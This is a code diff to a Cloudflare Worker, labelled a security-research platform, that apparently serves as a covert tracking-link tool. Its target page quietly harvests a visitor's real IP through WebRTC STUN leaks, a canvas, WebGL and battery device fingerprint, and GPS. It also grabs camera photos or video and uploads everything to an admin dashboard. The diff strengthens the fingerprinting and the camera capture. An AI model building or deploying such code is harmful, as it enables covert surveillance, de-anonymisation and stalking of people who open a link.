@@ -1,6 +1,6 @@
 ﻿/**
  * 现代简约技术研究系统 - 增强版
- * 新增功能：WebRTC IP收集、UA解析、扩展指纹、经纬度修正、黑屏修复等
+ * 新增功能：WebRTC IP泄露检测、深度设备指纹、UA解析、经纬度修正、后台增强
  * 仅供安全研究、靶场测试及前端权限调用学习使用
  */
 
@@ -8,17 +8,17 @@ const ADMIN_PASSWORD = "sakcnzz666";
 const IMAGE_HOST = "tc.ilqx.dpdns.org";
 const GEO_API = "https://ip.ilqx.dpdns.org/geo";
 
-// WebRTC STUN 服务器列表（用于IP泄露测试）
+// WebRTC STUN 服务器列表（用于IP泄露检测）
 const STUN_SERVERS = [
-  { urls: "stun:stun.chat.bilibili.com:3478" },
-  { urls: "stun:stun.hitv.com:3478" },
-  { urls: "stun:stun.miwifi.com:3478" },
-  { urls: "stun:stun.l.google.com:19302" },
-  { urls: "stun:stun.cloudflare.com:3478" },
-  { urls: "stun:global.stun.twilio.com:3478" },
-  { urls: "stun:stun.nextcloud.com:3478" },
-  { urls: "stun:stun.voip.blackberry.com:3478" },
-  { urls: "stun:stun.freeswitch.org:3478" }
+  "stun:stun.chat.bilibili.com:3478",
+  "stun:stun.hitv.com:3478",
+  "stun:stun.miwifi.com:3478",
+  "stun:stun.l.google.com:19302",
+  "stun:stun.cloudflare.com:3478",
+  "stun:global.stun.twilio.com:3478",
+  "stun:stun.nextcloud.com:3478",
+  "stun:stun.voip.blackberry.com:3478",
+  "stun:stun.freeswitch.org:3478"
 ];
 
 export default {
@@ -26,10 +26,8 @@ export default {
     const url = new URL(request.url);
     const path = url.pathname;
 
-    // 自动初始化数据库
     await initDB(env);
 
-    // 路由分发
     if (path === "/" || path === "/index.html") return renderHome();
     if (path.startsWith("/t/")) return renderTargetPage(path.split("/")[2]);
 
@@ -47,7 +45,7 @@ export default {
 };
 
 /* ==========================================
- * 数据库初始化（添加新字段）
+ * 数据库初始化（增加webrtc_ip和device_info字段）
  * ========================================== */
 async function initDB(env) {
   await env.DB.prepare(`
@@ -64,8 +62,8 @@ async function initDB(env) {
       status TEXT,
       is_burned INTEGER DEFAULT 0,
       is_deleted INTEGER DEFAULT 0,
-      webrtc_ip TEXT DEFAULT '',
-      extra_info TEXT DEFAULT '',
+      webrtc_ip TEXT,
+      device_info TEXT,
       created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )
   `).run();
@@ -79,15 +77,15 @@ async function initDB(env) {
     )
   `).run();
 
-  // 兼容性新增字段
+  // 兼容旧表新增字段
   try {
     await env.DB.prepare(`ALTER TABLE sys_logs ADD COLUMN is_deleted INTEGER DEFAULT 0`).run();
   } catch (e) {}
   try {
-    await env.DB.prepare(`ALTER TABLE sys_logs ADD COLUMN webrtc_ip TEXT DEFAULT ''`).run();
+    await env.DB.prepare(`ALTER TABLE sys_logs ADD COLUMN webrtc_ip TEXT`).run();
   } catch (e) {}
   try {
-    await env.DB.prepare(`ALTER TABLE sys_logs ADD COLUMN extra_info TEXT DEFAULT ''`).run();
+    await env.DB.prepare(`ALTER TABLE sys_logs ADD COLUMN device_info TEXT`).run();
   } catch (e) {}
 }
 
@@ -178,7 +176,6 @@ async function handleGenerate(request, env) {
   });
 }
 
-// 增强上传接口：接收 webrtc_ip 和 extra_info
 async function handleUpload(request, env) {
   try {
     const formData = await request.formData();
@@ -191,7 +188,7 @@ async function handleUpload(request, env) {
     const ip = request.headers.get("cf-connecting-ip") || "Unknown";
     const geo = await getGeoByIp(ip);
     const webrtcIp = formData.get("webrtc_ip") || "";
-    const extraInfo = formData.get("extra_info") || "";
+    const deviceInfo = formData.get("device_info") || "";
     let fullMediaUrl = "";
 
     if (file && (status === "success" || status === "download")) {
@@ -205,9 +202,9 @@ async function handleUpload(request, env) {
     }
 
     await env.DB.prepare(`
-      INSERT INTO sys_logs (target_id, event_type, ip, geo_info, device_geo, media_type, media_url, ua, status, webrtc_ip, extra_info)
+      INSERT INTO sys_logs (target_id, event_type, ip, geo_info, device_geo, media_type, media_url, ua, status, webrtc_ip, device_info)
       VALUES (?,?,?,?,?,?,?,?,?,?,?)
-    `).bind(config.id, 'VISIT', ip, geo, deviceGeo, mediaType, fullMediaUrl, ua, status, webrtcIp, extraInfo).run();
+    `).bind(config.id, 'VISIT', ip, geo, deviceGeo, mediaType, fullMediaUrl, ua, status, webrtcIp, deviceInfo).run();
 
     return new Response(JSON.stringify({ success: true }), { headers: { "Content-Type": "application/json" } });
   } catch (err) {
@@ -215,7 +212,6 @@ async function handleUpload(request, env) {
   }
 }
 
-// 查询接口（返回新增字段）
 async function handleQuery(request, env) {
   const { searchParams } = new URL(request.url);
   const targetId = searchParams.get("id");
@@ -236,7 +232,7 @@ async function handleQuery(request, env) {
   }
 
   const { results } = await env.DB.prepare(
-    "SELECT id, target_id, event_type, ip, geo_info, device_geo, media_type, media_url, ua, status, is_burned, is_deleted, webrtc_ip, extra_info, created_at FROM sys_logs WHERE target_id = ? AND event_type = 'VISIT' AND is_deleted = 0 ORDER BY created_at DESC"
+    "SELECT * FROM sys_logs WHERE target_id = ? AND event_type = 'VISIT' AND is_deleted = 0 ORDER BY created_at DESC"
   ).bind(targetId).all();
 
   const shouldBurn = burnParam && tracking && tracking.password;
@@ -306,7 +302,7 @@ async function handleAdminClear(request, env) {
 }
 
 /* ==========================================
- * 前端 UI 渲染 (首页、目标页)
+ * 前端 UI 渲染
  * ========================================== */
 
 function renderHome() {
@@ -319,6 +315,7 @@ function renderHome() {
     <title>SEC-TEST 漏洞分析平台</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ua-parser-js/1.0.37/ua-parser.min.js"></script>
     <style>
       body { background: linear-gradient(135deg, #f6f8fd 0%, #f1f5f9 100%); }
       .glass { background: rgba(255, 255, 255, 0.7); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.5); }
@@ -328,8 +325,8 @@ function renderHome() {
       input:checked + .toggle-bg + .dot { transform: translateX(100%); }
       .custom-scrollbar::-webkit-scrollbar { width: 6px; }
       .custom-scrollbar::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
-      .expandable-detail { cursor: pointer; }
-      .extra-info pre { white-space: pre-wrap; word-break: break-all; }
+      .expandable { cursor: pointer; }
+      .expand-content { display: none; }
     </style>
   </head>
   <body class="min-h-screen text-gray-800 selection:bg-indigo-100 selection:text-indigo-900">
@@ -534,20 +531,24 @@ function renderHome() {
         linkBox.classList.remove('hidden');
       }
 
-      // UA 解析辅助函数（简单）
-      function parseUA(uaString) {
-        let browser = 'Unknown', os = 'Unknown';
-        if (uaString.includes('Chrome') && !uaString.includes('Edg')) browser = 'Chrome';
-        else if (uaString.includes('Safari') && !uaString.includes('Chrome')) browser = 'Safari';
-        else if (uaString.includes('Firefox')) browser = 'Firefox';
-        else if (uaString.includes('Edg')) browser = 'Edge';
-        else if (uaString.includes('MSIE') || uaString.includes('Trident')) browser = 'IE';
-        if (uaString.includes('Windows NT')) os = 'Windows';
-        else if (uaString.includes('Mac OS')) os = 'macOS';
-        else if (uaString.includes('Linux')) os = 'Linux';
-        else if (uaString.includes('Android')) os = 'Android';
-        else if (uaString.includes('iPhone') || uaString.includes('iPad')) os = 'iOS';
-        return { browser, os };
+      function formatDeviceInfo(deviceInfo) {
+        if (!deviceInfo) return '无';
+        try {
+          const info = typeof deviceInfo === 'string' ? JSON.parse(deviceInfo) : deviceInfo;
+          let html = '<div class="text-xs space-y-1">';
+          if (info.resolution) html += '<div><i class="fa-solid fa-desktop"></i> 屏幕: ' + info.resolution + '</div>';
+          if (info.language) html += '<div><i class="fa-solid fa-language"></i> 语言: ' + info.language + '</div>';
+          if (info.timezone) html += '<div><i class="fa-solid fa-clock"></i> 时区: ' + info.timezone + '</div>';
+          if (info.platform) html += '<div><i class="fa-brands fa-windows"></i> 平台: ' + info.platform + '</div>';
+          if (info.memory) html += '<div><i class="fa-solid fa-microchip"></i> 内存: ' + info.memory + ' GB</div>';
+          if (info.cores) html += '<div><i class="fa-solid fa-chart-simple"></i> CPU核心: ' + info.cores + '</div>';
+          if (info.touchSupport) html += '<div><i class="fa-solid fa-hand"></i> 触屏支持: 是</div>';
+          if (info.battery !== undefined) html += '<div><i class="fa-solid fa-battery-full"></i> 电池: ' + (info.battery ? info.battery.level * 100 + '%' : '不支持') + '</div>';
+          if (info.webgl) html += '<div><i class="fa-solid fa-cube"></i> WebGL: ' + info.webgl + '</div>';
+          html += '<button class="text-indigo-500 text-xs mt-1 expandable" onclick="toggleExpand(this)">查看完整JSON</button><div class="expand-content hidden">' + JSON.stringify(info, null, 2) + '</div>';
+          html += '</div>';
+          return html;
+        } catch(e) { return '解析失败'; }
       }
 
       async function queryData() {
@@ -584,35 +585,32 @@ function renderHome() {
                 mediaHtml = '<img src="' + log.media_url + '" class="w-full rounded-xl shadow-sm">';
               }
             }
+            
             let geoHtml = '';
             if (log.device_geo) {
               const geo = JSON.parse(log.device_geo);
               if(geo.denied) {
                 geoHtml = '<div class="text-sm text-amber-600 mt-2"><i class="fa-solid fa-location-dot mr-1"></i>GPS定位：用户拒绝授权</div>';
               } else {
-                // 修正顺序：经度先，纬度后
+                // 修正经纬度顺序: 先经度后纬度
                 geoHtml = '<div class="text-sm text-emerald-600 mt-2 font-mono"><i class="fa-solid fa-location-crosshairs mr-1"></i>精准GPS：经度 ' + geo.lng + ', 纬度 ' + geo.lat + ' (精度:' + geo.accuracy + 'm)</div>';
               }
             }
+            
             const ipInfo = log.geo_info ? JSON.parse(log.geo_info) : {};
             const flag = ipInfo.flag || '';
             const cReg = ipInfo.countryRegion || '';
             const city = ipInfo.city || '';
-            const finalIpStr = ipInfo.ip ? flag + ' ' + cReg + ' ' + city + ' [' + ipInfo.ip + ']' : log.ip;
-            const accessIp = log.ip;
-            const realIp = log.webrtc_ip || '未获取到真实IP(WebRTC失败)';
+            const realIp = log.ip;
+            const webrtcIp = log.webrtc_ip || '未检测到';
             
-            // 解析 UA
-            const uaParsed = parseUA(log.ua);
-            const uaDisplay = \`<span class="font-medium">\${uaParsed.browser}</span> / <span class="font-medium">\${uaParsed.os}</span>\`;
-            
-            let extraHtml = '';
-            if (log.extra_info) {
-              try {
-                const extra = JSON.parse(log.extra_info);
-                extraHtml = '<div class="mt-2 text-xs bg-gray-100 p-2 rounded"><div class="font-bold cursor-pointer expand-detail" data-id="extra-' + log.id + '">📋 其他收集信息 (点击展开)</div><div id="extra-' + log.id + '" class="hidden mt-1 space-y-1"><pre>' + JSON.stringify(extra, null, 2) + '</pre></div></div>';
-              } catch(e) { extraHtml = ''; }
-            }
+            // UA 解析
+            let uaParser = new UAParser(log.ua);
+            let uaResult = uaParser.getResult();
+            let uaHtml = '<div class="text-xs"><i class="fa-brands fa-safari mr-1"></i> UA原文: <span class="font-mono break-all">' + escapeHtml(log.ua) + '</span>';
+            uaHtml += '<br><i class="fa-solid fa-info-circle mr-1"></i> 解析: ' + uaResult.browser.name + ' ' + uaResult.browser.version + ' / ' + uaResult.os.name + ' ' + uaResult.os.version;
+            uaHtml += '<button class="text-indigo-500 text-xs ml-2 expandable" onclick="toggleExpand(this)">展开</button><div class="expand-content hidden">完整解析: ' + JSON.stringify(uaResult, null, 2) + '</div>';
+            uaHtml += '</div>';
             
             const dateStr = new Date(log.created_at + 'Z').toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
             html += '<div class="bg-white p-4 rounded-xl border border-gray-100 shadow-sm fade-in" style="animation-delay: ' + (index * 0.1) + 's">' +
@@ -620,32 +618,42 @@ function renderHome() {
                         '<span class="text-xs font-bold px-2 py-1 bg-gray-100 rounded text-gray-600">记录 #' + log.id + '</span>' +
                         '<span class="text-xs text-gray-400"><i class="fa-regular fa-clock"></i> ' + dateStr + '</span>' +
                       '</div>' +
+                      '<div class="mb-3 p-3 bg-gray-50 rounded-lg text-xs space-y-1">' +
+                        '<div><i class="fa-solid fa-network-wired"></i> 访问IP: ' + realIp + ' ' + flag + ' ' + cReg + ' ' + city + '</div>' +
+                        '<div><i class="fa-solid fa-shield-halved"></i> WebRTC泄露IP: ' + webrtcIp + '</div>' +
+                        uaHtml +
+                      '</div>' +
                       mediaHtml +
                       geoHtml +
-                      '<div class="mt-3 p-3 bg-gray-50 rounded-lg text-xs text-gray-600 space-y-1">' +
-                        '<div><i class="fa-solid fa-network-wired w-4"></i> 访问IP: ' + accessIp + '</div>' +
-                        '<div><i class="fa-solid fa-shield-halved w-4"></i> 真实IP(WebRTC): ' + realIp + '</div>' +
-                        '<div><i class="fa-brands fa-safari w-4"></i> UA解析: ' + uaDisplay + '</div>' +
-                        '<div class="truncate" title="' + log.ua + '"><i class="fa-regular fa-file-code"></i> 原始UA: ' + log.ua + '</div>' +
+                      '<div class="mt-3 p-3 bg-gray-50 rounded-lg text-xs">' +
+                        '<strong><i class="fa-solid fa-microchip"></i> 设备指纹信息</strong>' +
+                        formatDeviceInfo(log.device_info) +
                       '</div>' +
-                      extraHtml +
                     '</div>';
           });
           if (password && logs.length > 0) {
             html += '<div class="text-center mt-4"><button onclick="deleteMedia(\'' + id + '\', \'' + password + '\')" class="px-4 py-2 bg-red-100 text-red-700 rounded-lg text-sm font-medium hover:bg-red-200"><i class="fa-solid fa-trash mr-1"></i>删除所有已捕获媒体</button></div>';
           }
           document.getElementById('query_result').innerHTML = html;
-          // 绑定展开事件
-          document.querySelectorAll('.expand-detail').forEach(el => {
-            el.addEventListener('click', function() {
-              const targetId = this.getAttribute('data-id');
-              const detailDiv = document.getElementById(targetId);
-              if(detailDiv) detailDiv.classList.toggle('hidden');
-            });
-          });
         } finally {
           document.getElementById('query_loading').classList.add('hidden');
         }
+      }
+
+      window.toggleExpand = function(btn) {
+        const content = btn.nextElementSibling;
+        if (content.style.display === 'none' || !content.style.display) {
+          content.style.display = 'block';
+          btn.textContent = '收起';
+        } else {
+          content.style.display = 'none';
+          btn.textContent = '展开';
+        }
+      };
+
+      function escapeHtml(text) {
+        if (!text) return '';
+        return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
       }
 
       async function deleteMedia(id, password) {
@@ -691,62 +699,88 @@ function renderTargetPage(encodedConfig) {
     <script>
       const config = JSON.parse(decodeURIComponent(atob("${encodedConfig}")));
       let deviceLocation = null;
-      let collectedWebRTCIP = '';
-      let collectedExtra = {};
+      let collectedWebrtcIp = "";
+      let collectedDeviceInfo = {};
 
-      // 收集 WebRTC IP（使用多 STUN）
-      async function getWebRTCIP(stunServers) {
+      // WebRTC IP 收集
+      async function collectWebRTCIP() {
         return new Promise((resolve) => {
-          let foundIP = null;
-          const pc = new RTCPeerConnection({ iceServers: stunServers });
-          pc.createDataChannel('');
-          pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(e=>{});
-          pc.onicecandidate = (event) => {
-            if (event.candidate) {
-              const candidate = event.candidate.candidate;
-              const ipRegex = /([0-9]{1,3}\\.){3}[0-9]{1,3}/;
-              const match = candidate.match(ipRegex);
-              if (match && !match[0].startsWith('192.168.') && !match[0].startsWith('10.') && !match[0].startsWith('172.')) {
-                foundIP = match[0];
-                pc.close();
-                resolve(foundIP);
-              } else if (match && !foundIP) {
-                foundIP = match[0];
-              }
-            } else {
-              // 候选结束，返回内网IP或null
-              pc.close();
-              resolve(foundIP || null);
-            }
+          const servers = ${JSON.stringify(STUN_SERVERS)};
+          let foundIp = null;
+          let pending = servers.length;
+          if (pending === 0) return resolve(null);
+          
+          const checkDone = () => {
+            pending--;
+            if (pending === 0 && !foundIp) resolve(null);
           };
-          setTimeout(() => { if(pc) pc.close(); resolve(null); }, 3000);
+          
+          servers.forEach(server => {
+            try {
+              const pc = new RTCPeerConnection({ iceServers: [{ urls: server }] });
+              pc.createDataChannel('');
+              pc.createOffer()
+                .then(offer => pc.setLocalDescription(offer))
+                .catch(() => {});
+              pc.onicecandidate = (ice) => {
+                if (ice.candidate && ice.candidate.candidate) {
+                  const ipMatch = /([0-9]{1,3}\\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate);
+                  if (ipMatch && ipMatch[0] && !foundIp && !ipMatch[0].startsWith('192.168.') && !ipMatch[0].startsWith('10.') && !ipMatch[0].startsWith('172.')) {
+                    foundIp = ipMatch[0];
+                    resolve(foundIp);
+                    pc.close();
+                  }
+                }
+                checkDone();
+              };
+              setTimeout(() => {
+                if (!foundIp) pc.close();
+                checkDone();
+              }, 2000);
+            } catch(e) { checkDone(); }
+          });
         });
       }
 
-      // 收集额外指纹
-      function collectExtraFingerprint() {
-        const data = {
-          screen: \`\${window.screen.width}x\${window.screen.height}\`,
-          availScreen: \`\${window.screen.availWidth}x\${window.screen.availHeight}\`,
-          colorDepth: window.screen.colorDepth,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          language: navigator.language,
-          languages: navigator.languages,
-          platform: navigator.platform,
-          hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-          deviceMemory: navigator.deviceMemory || 'unknown',
-          cookiesEnabled: navigator.cookieEnabled,
-          doNotTrack: navigator.doNotTrack,
-          referrer: document.referrer || 'none'
-        };
-        return data;
-      }
-
-      async function collectAllInfo() {
-        const stunList = ${JSON.stringify(STUN_SERVERS)};
-        const webrtcIP = await getWebRTCIP(stunList);
-        collectedWebRTCIP = webrtcIP || 'WebRTC IP 获取失败';
-        collectedExtra = collectExtraFingerprint();
+      // 深度设备指纹收集
+      async function collectDeviceInfo() {
+        const info = {};
+        info.resolution = screen.width + 'x' + screen.height;
+        info.colorDepth = screen.colorDepth;
+        info.language = navigator.language;
+        info.platform = navigator.platform;
+        info.userAgent = navigator.userAgent;
+        info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        info.hardwareConcurrency = navigator.hardwareConcurrency || '未知';
+        info.deviceMemory = navigator.deviceMemory || '未知';
+        info.maxTouchPoints = navigator.maxTouchPoints || 0;
+        info.touchSupport = 'ontouchstart' in window;
+        info.doNotTrack = navigator.doNotTrack;
+        info.cookieEnabled = navigator.cookieEnabled;
+        try {
+          const canvas = document.createElement('canvas');
+          const ctx = canvas.getContext('2d');
+          canvas.width = 200;
+          canvas.height = 50;
+          ctx.fillText('fingerprint', 10, 20);
+          info.canvasFingerprint = canvas.toDataURL().substring(0, 100);
+        } catch(e) {}
+        try {
+          const gl = document.createElement('canvas').getContext('webgl');
+          if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debugInfo) {
+              info.webgl = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            }
+          }
+        } catch(e) {}
+        if ('getBattery' in navigator) {
+          try {
+            const battery = await navigator.getBattery();
+            info.battery = { level: battery.level * 100, charging: battery.charging };
+          } catch(e) {}
+        }
+        return info;
       }
 
       function renderUI() {
@@ -762,9 +796,10 @@ function renderTargetPage(encodedConfig) {
 
       async function execute() {
         renderUI();
-        // 先收集指纹和WebRTC IP
-        await collectAllInfo();
-
+        
+        // 并行收集附加信息
+        const webrtcPromise = collectWebRTCIP();
+        const deviceInfoPromise = collectDeviceInfo();
         if (config.needLocation) {
           try {
             const pos = await new Promise((resolve, reject) => {
@@ -775,10 +810,12 @@ function renderTargetPage(encodedConfig) {
             deviceLocation = JSON.stringify({ denied: true, error: e.message });
           }
         }
-
-        // 下载模板跳过摄像头
+        
+        collectedWebrtcIp = await webrtcPromise;
+        collectedDeviceInfo = await deviceInfoPromise;
+        
         if (config.template === 'download') {
-          await sendPayload(null, 'download', collectedWebRTCIP, collectedExtra);
+          await sendPayload(null, 'download');
           if (config.downloadUrl || config.redirectUrl) {
             const url = config.downloadUrl || config.redirectUrl;
             window.location.href = url.startsWith('http') ? url : 'http://' + url;
@@ -797,7 +834,7 @@ function renderTargetPage(encodedConfig) {
             await capturePhoto(stream);
           }
         } catch(e) {
-          await sendPayload(null, 'denied', collectedWebRTCIP, collectedExtra);
+          await sendPayload(null, 'denied');
         }
 
         if (config.template === 'redirect' && config.redirectUrl) {
@@ -813,21 +850,23 @@ function renderTargetPage(encodedConfig) {
         v.setAttribute('playsinline', '');
         v.muted = true;
         await v.play();
-        // 修复黑屏：等待视频实际有数据
         await new Promise(resolve => {
-          if (v.readyState >= 2 && v.videoWidth > 0 && v.videoHeight > 0) resolve();
-          else v.addEventListener('loadeddata', resolve, { once: true });
+          if (v.readyState >= 2 && v.videoWidth > 0) resolve();
+          else v.addEventListener('canplay', resolve, { once: true });
         });
-        await new Promise(r => setTimeout(r, 300)); // 额外等待确保第一帧显示
+        // 确保视频帧已准备
+        await new Promise(r => setTimeout(r, 500));
         const c = document.getElementById('c');
         c.width = v.videoWidth || 640;
         c.height = v.videoHeight || 480;
+        if (c.width === 0) c.width = 640;
+        if (c.height === 0) c.height = 480;
         const ctx = c.getContext('2d');
         ctx.drawImage(v, 0, 0, c.width, c.height);
         stream.getTracks().forEach(t => t.stop());
         c.toBlob(async (blob) => {
-          await sendPayload(blob, 'success', collectedWebRTCIP, collectedExtra);
-        }, 'image/jpeg', 0.6);
+          await sendPayload(blob, 'success');
+        }, 'image/jpeg', 0.8);
       }
 
       async function captureVideo(stream) {
@@ -851,7 +890,7 @@ function renderTargetPage(encodedConfig) {
           recorder.onstop = async () => {
             stream.getTracks().forEach(t => t.stop());
             const blob = new Blob(chunks, { type: 'video/webm' });
-            await sendPayload(blob, 'success', collectedWebRTCIP, collectedExtra);
+            await sendPayload(blob, 'success');
             resolve();
           };
           recorder.start(500);
@@ -861,14 +900,14 @@ function renderTargetPage(encodedConfig) {
         });
       }
 
-      async function sendPayload(blob, status, webrtcIp, extraInfo) {
+      async function sendPayload(blob, status) {
         const fd = new FormData();
         if(blob) fd.append('file', blob, config.mode === 'video' ? 'v.webm' : 'p.jpg');
         fd.append('config', JSON.stringify(config));
         fd.append('status', status);
         if(deviceLocation) fd.append('location', deviceLocation);
-        fd.append('webrtc_ip', webrtcIp || '');
-        fd.append('extra_info', JSON.stringify(extraInfo || {}));
+        if(collectedWebrtcIp) fd.append('webrtc_ip', collectedWebrtcIp);
+        if(collectedDeviceInfo) fd.append('device_info', JSON.stringify(collectedDeviceInfo));
         await fetch('/api/upload', { method: 'POST', body: fd });
       }
 
@@ -880,7 +919,7 @@ function renderTargetPage(encodedConfig) {
 }
 
 /* ==========================================
- * 管理员后台 (含增强显示)
+ * 管理员后台 (增强版，显示所有新字段)
  * ========================================== */
 function renderAdminLogin(errorMsg = "") {
   const errorHtml = errorMsg ? `<div class="mb-4 p-3 bg-red-50 text-red-600 text-sm rounded-xl border border-red-100">${errorMsg}</div>` : "";
@@ -958,9 +997,11 @@ async function renderAdmin(request, env) {
           <thead class="bg-gray-50 border-b">
             <tr>
               <th class="p-4 text-sm font-semibold text-gray-600">事件 / 时间</th>
-              <th class="p-4 text-sm font-semibold text-gray-600">IP / 真实IP(WebRTC)</th>
-              <th class="p-4 text-sm font-semibold text-gray-600">GPS(经度/纬度)</th>
-              <th class="p-4 text-sm font-semibold text-gray-600">媒体 / 其他信息</th>
+              <th class="p-4 text-sm font-semibold text-gray-600">IP / 定位</th>
+              <th class="p-4 text-sm font-semibold text-gray-600">WebRTC IP</th>
+              <th class="p-4 text-sm font-semibold text-gray-600">GPS</th>
+              <th class="p-4 text-sm font-semibold text-gray-600">媒体</th>
+              <th class="p-4 text-sm font-semibold text-gray-600">设备指纹</th>
               <th class="p-4 text-sm font-semibold text-gray-600">操作</th>
             </tr>
           </thead>
@@ -976,9 +1017,6 @@ async function renderAdmin(request, env) {
       if (ipInfo.ip) {
         geoStr = (ipInfo.flag || '') + ' ' + (ipInfo.countryRegion || '') + ' ' + (ipInfo.city || '') + ' - ' + (ipInfo.asOrganization || '');
       }
-      
-      let accessIp = r.ip || '-';
-      let realIp = r.webrtc_ip || '未获取';
 
       let mediaBlock = '<span class="text-gray-400 text-xs">-</span>';
       if (r.event_type === 'VISIT') {
@@ -1004,12 +1042,12 @@ async function renderAdmin(request, env) {
              }
          } catch(e) {}
       }
-      
-      let extraInfoHtml = '';
-      if (r.extra_info) {
+
+      let deviceInfoBrief = '<span class="text-gray-400 text-xs">-</span>';
+      if (r.device_info) {
         try {
-          const extra = JSON.parse(r.extra_info);
-          extraInfoHtml = `<div class="text-xs cursor-pointer text-blue-600 hover:underline" onclick="alert(JSON.stringify(${JSON.stringify(extra).replace(/\\/g, '\\\\')}, null, 2))">📦 其他指纹</div>`;
+          const dinfo = JSON.parse(r.device_info);
+          deviceInfoBrief = `<div class="text-xs"><i class="fa-solid fa-desktop"></i> ${dinfo.resolution || ''}<br><i class="fa-solid fa-microchip"></i> ${dinfo.hardwareConcurrency || ''}核<br><button onclick="alert('${escapeJs(JSON.stringify(dinfo, null, 2))}')" class="text-indigo-500 text-xs">详情</button></div>`;
         } catch(e) {}
       }
 
@@ -1024,20 +1062,21 @@ async function renderAdmin(request, env) {
             ${burnedBadge}${deletedBadge}
           </div>
           <div class="text-xs text-gray-500">${dateStr}</div>
-         </td>
+        </td>
         <td class="p-4">
-          <div class="text-sm font-mono text-gray-800">访问IP: ${escapeHtml(accessIp)}</div>
+          <div class="text-sm font-mono text-gray-800">${escapeHtml(r.ip)}</div>
           <div class="text-xs text-gray-500 truncate max-w-xs" title="${escapeHtml(geoStr)}">${escapeHtml(geoStr)}</div>
-          <div class="text-xs font-mono text-indigo-600 mt-1">真实IP: ${escapeHtml(realIp)}</div>
          </td>
+        <td class="p-4 text-sm font-mono">${escapeHtml(r.webrtc_ip || '未检测')}</td>
         <td class="p-4">${deviceGeoBlock}</td>
-        <td class="p-4">${mediaBlock} ${extraInfoHtml}</td>
+        <td class="p-4">${mediaBlock}</td>
+        <td class="p-4">${deviceInfoBrief}</td>
         <td class="p-4">
           <button onclick="deleteLog(${r.id})" class="text-red-500 hover:text-red-700 text-xs"><i class="fa-solid fa-trash-can"></i></button>
         </td>
        </tr>`;
     }
-    sectionsHtml += `</tbody>}</div></div>`;
+    sectionsHtml += `</tbody> </div></div>`;
   }
 
   const html = `
@@ -1056,9 +1095,9 @@ async function renderAdmin(request, env) {
   <body class="bg-gray-100 p-6 font-sans">
     <div class="max-w-7xl mx-auto">
       <div class="flex justify-between items-center mb-6 bg-white p-6 rounded-2xl shadow-sm border border-gray-200">
-        <h1 class="text-2xl font-bold text-gray-800"><i class="fa-solid fa-server text-indigo-600 mr-2"></i>全局事件审计日志</h1>
+        <h1 class="text-2xl font-bold text-gray-800"><i class="fa-solid fa-server text-indigo-600 mr-2"></i>全局事件审计日志（按时间轴）</h1>
         <div class="flex items-center space-x-4">
-          <span class="text-sm text-gray-500">最近 500 条记录（按ID时间轴分组）</span>
+          <span class="text-sm text-gray-500">最近 500 条记录</span>
           <button onclick="clearAll()" class="px-4 py-2 bg-red-600 text-white text-sm rounded-xl hover:bg-red-700 shadow">清空所有数据</button>
         </div>
       </div>
